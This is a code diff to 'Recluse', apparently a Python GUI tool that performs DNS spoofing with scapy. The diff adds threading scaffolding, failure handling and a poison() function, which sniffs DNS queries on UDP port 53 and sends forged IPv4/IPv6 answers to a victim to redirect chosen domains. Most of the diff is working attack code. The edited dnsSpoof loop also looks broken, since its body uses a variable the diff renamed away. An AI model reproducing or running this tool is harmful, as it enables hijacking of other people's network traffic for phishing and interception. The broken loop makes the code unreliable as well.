@@ -4,6 +4,8 @@ import subprocess
 import re
 from datetime import datetime
 import shutil
+from threading import Thread
+from queue import Queue
 from socket import gethostbyname, getaddrinfo, AF_INET6
 from scapy.all import *
 #from tkinter import filedialog
@@ -19,6 +21,8 @@ class dns_window(QMainWindow):
         self.htmloption = False
         self.running = False
         title = 'Recluse'
+        self.q= Queue()
+        self.t1 = ""
         self.interface = ""
         self.Version = "Ubuntu"
         self.hostdict = {}
@@ -285,7 +289,6 @@ class dns_window(QMainWindow):
                 IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
                 self.lists.addItem(IP)
             self.interface = IpsMACs[(len(IpsMACs)-1)]
-            
 
     #Labels,Buttons&TextBox
     def labels(self):
@@ -322,7 +325,7 @@ class dns_window(QMainWindow):
         urls = domains.readlines()
         for url in urls:
             tobytes = bytes(url.strip(), encoding="utf-8")
-            self.hostdict[tobytes] = ""
+            self.hostdict[tobytes] = "1"
             self.dropdown.addItem(url.strip())
         self.dropdown.move(320,100)
 
@@ -352,8 +355,9 @@ class dns_window(QMainWindow):
     
     #Spoof/Poison Functions
     def dnsSpoof(self,pkt):
-
-        for Names in self.hostdict: #For loop to check each name in hostDict
+        #if self.q.get() != "stop":
+        for key in self.hostdict.items():
+            print(key) #For loop to check each name in hostDict
             if (DNS in pkt and Names in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
                 print(f'packet found {Names}')
                 if IP in pkt:
@@ -372,6 +376,9 @@ class dns_window(QMainWindow):
                     DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
                     spoofpkt = IPv6pkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
                     sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
+           # self.q.put("run")
+        #else:
+            #SystemExit()
 
     def set_spoof(self,radio):
         if radio.text() == "Spoof HTML":
@@ -380,7 +387,12 @@ class dns_window(QMainWindow):
             else:
                 htmloption = False
 
+    def poison(self):
+        pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoof)
+        print(pkt.summary())
+
     def Start(self):
+        failed = 0
         if self.running == False:
             self.running = True
             if self.Version == "Ubuntu":
@@ -395,16 +407,31 @@ class dns_window(QMainWindow):
                 system('ipconfig /flushdns')
             if self.entry.text() != "": 
                 redirect = self.entry.text()
-                self.ip = gethostbyname(redirect)
-                self.ipv6 = ""
+                try:
+                    self.ip = gethostbyname(redirect)
+                    self.ipv6 = ""
+                except:
+                    failed =  failed + 1
+                    pass
                 try:
                     self.ipv6 = getaddrinfo(redirect,None,AF_INET6)[0][4][0]
                 except:
-                    pass       
-                time = datetime.now()
-                self.lists2.addItem(f"Poisoning has begun {time}")
-                pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoof)
-                print(pkt.summary())
+                    failed = failed + 1
+                    pass
+                if failed == 2:
+                    warnBox = QMessageBox(self)
+                    warnBox.setIcon(QMessageBox.Warning)
+                    warnBox.setWindowTitle("Redirect Warning")
+                    warnBox.setText("An error occurred for the domain given")
+                    warnBox.exec()
+                    self.Stop()
+                else:
+                    time = datetime.now()
+                    self.lists2.addItem(f"Poisoning has begun {time}")
+                    self.poison()
+                    #self.q.put("run")
+                    #self.t1 = Thread(target=self.poison, daemon= True)
+                    #self.t1.start()
             else:
                 warnBox = QMessageBox(self)
                 warnBox.setIcon(QMessageBox.Warning)
@@ -418,6 +445,9 @@ class dns_window(QMainWindow):
             self.running = False
             time = datetime.now()
             self.lists2.addItem(f"Poisoning has ended {time}")
+        if self.t1 != "":
+            self.q.put("stop")
+            self.t1 = ""
     
     #Error box
     def errorbox(self):
